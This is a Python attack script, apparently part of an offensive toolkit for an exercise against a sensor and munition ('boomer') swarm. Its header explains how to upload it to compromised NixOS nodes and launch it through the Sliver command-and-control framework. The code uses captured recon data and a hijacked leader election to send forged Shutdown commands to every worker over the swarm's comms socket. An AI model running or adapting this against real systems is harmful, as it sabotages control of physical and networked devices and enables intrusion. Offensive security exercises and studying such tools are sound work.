#!/usr/bin/env python3
# USAGE ON SWARM NODES (NixOS):
#   Upload to /tmp/payloads/05_kill_swarm.py, then run it with the full Python path:
#     /run/current-system/sw/bin/python3 /tmp/payloads/05_kill_swarm.py [args]
#   If launching through Sliver, use:
#     execute -o /run/current-system/sw/bin/python3 -- /tmp/payloads/05_kill_swarm.py [args]
#   Common helper binaries are also under /run/current-system/sw/bin/, e.g.:
#     /run/current-system/sw/bin/cat
#     /run/current-system/sw/bin/ls
#     /run/current-system/sw/bin/bash
"""
offense/05_kill_swarm.py

Sends Shutdown to every sensor and boomer through the local comms
socket. Defaults to recon.json and captured_coa.json so no UUID/socket
editing is required.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gg_core  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--recon", default=gg_core.DEFAULT_RECON_PATH)
    ap.add_argument("--dwell", type=float, default=1.0, help="seconds to wait between encoding rounds")
    ap.add_argument("--coa-file", default="", help="optional override; default uses live election sock")
    args = ap.parse_args()

    recon = gg_core.load_recon(args.recon)
    our_uuid = recon.get("our_uuid", "")
    comms_sock = recon.get("comms_socket", "")
    election_sock = recon.get("election_socket", "")
    workers = gg_core.worker_uuids(recon)
    if not our_uuid or not comms_sock:
        print("[!] recon is missing our_uuid or comms_socket", file=sys.stderr)
        return 2

    if args.coa_file:
        coa = gg_core.load_coa(args.coa_file)
        print(f"[*] Loaded COA from {args.coa_file}")
    else:
        print("[*] Confirming leadership via election socket...")
        try:
            coa = gg_core.read_coa(election_sock)
        except OSError as e:
            print(f"[!] Cannot read election socket: {e}")
            return 2

    if coa.is_empty():
        print("[!] NOT LEADER. Win the election first.")
        return 1
    print(f"[+] Leader confirmed ({len(coa.endorsements)} endorsements)")

    print(f"[*] Targets: {len(recon.get('sensors', []))} sensors + {len(recon.get('boomers', []))} boomers = {len(workers)} workers")

    comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        comms.connect(comms_sock)
    except OSError as e:
        print(gg_core.format_socket_error(comms_sock, e, action="connect to"), file=sys.stderr)
        comms.close()
        return 2

    print("[*] Round 1: Shutdown with base64({}) payload")
    for worker in workers:
        comms.sendall(gg_core.make_shutdown_tx(our_uuid, worker, coa, b64_payload=True))
        print(f"  -> Shutdown[b64] -> {worker[:8]}")
    time.sleep(args.dwell)

    print("\n[*] Round 2: Shutdown with raw {} payload")
    for worker in workers:
        comms.sendall(gg_core.make_shutdown_tx(our_uuid, worker, coa, b64_payload=False))
        print(f"  -> Shutdown[raw] -> {worker[:8]}")

    comms.close()
    print(f"\n[+] Queued {len(workers) * 2} Shutdowns")
    print("[*] Workers terminate on next poll cycle (~1-2s)")
    print("[+] SWARM KILL COMPLETE")
    return 0


if __name__ == "__main__":
    sys.exit(gg_core.run_main(main))
